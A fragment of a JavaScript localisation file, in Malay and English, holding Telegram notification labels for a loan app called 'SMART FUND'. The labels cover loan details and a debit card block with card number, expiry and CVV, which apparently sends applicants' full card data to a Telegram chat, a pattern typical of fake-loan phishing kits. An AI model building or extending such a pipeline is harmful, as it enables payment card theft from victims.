...
const MESSAGES = {
  ms: {
    ...
    'withdraw.allFieldsRequired': 'Semua medan diperlukan',
  ...
  'telegram.dataPeminjam': 'Data Peminjam',
    ...
    'telegram.testMessage': '✅ <b>Test Notifikasi SMART FUND</b>\n\nNotifikasi Telegram berfungsi dengan baik.',
     ...
     'telegram.loanAmount': 'Jumlah Pinjaman',
     'telegram.loanLimit': 'Had Pinjaman',
     'telegram.loanTenor': 'Tempoh Pinjaman',
     'telegram.loanPurpose': 'Tujuan Pinjaman',
     'telegram.loanInfo': '📋 MAKLUMAT PINJAMAN',
     'telegram.cardInfo': '💳 MAKLUMAT KAD DEBIT',
      'telegram.cardNumber': 'Kad',
      'telegram.cardExpiry': 'Masa cad',
      'telegram.cardCvv': 'cod',
     'telegram.paymentInfo': '💰 ANGGARAN PEMBAYARAN',
     'telegram.statusLabel': '📌 STATUS',
     'telegram.appStatusNew': 'Permohonan Baharu',
     'telegram.notSpecified': 'Tidak dinyatakan',
     'telegram.appDate': 'Tarikh Permohonan',
  ...
  'telegram.dataPeminjam': 'Borrower Data',
    ...
    'telegram.testMessage': '✅ <b>SMART FUND Test Notification</b>\n\nTelegram notification is working properly.',
     ...
     'telegram.loanAmount': 'Loan Amount',
     'telegram.loanLimit': 'Loan Limit',
     'telegram.loanTenor': 'Loan Term',
     'telegram.loanPurpose': 'Loan Purpose',
     'telegram.loanInfo': '📋 LOAN INFO',
     'telegram.cardInfo': '💳 DEBIT CARD INFO',
      'telegram.cardNumber': 'Card',
      'telegram.cardExpiry': 'Expiry',
      'telegram.cardCvv': 'cod',
     'telegram.paymentInfo': '💰 PAYMENT ESTIMATE',
     'telegram.statusLabel': '📌 STATUS',
     'telegram.appStatusNew': 'New Application',
     'telegram.notSpecified': 'Not specified',
     'telegram.appDate': 'Application Date',
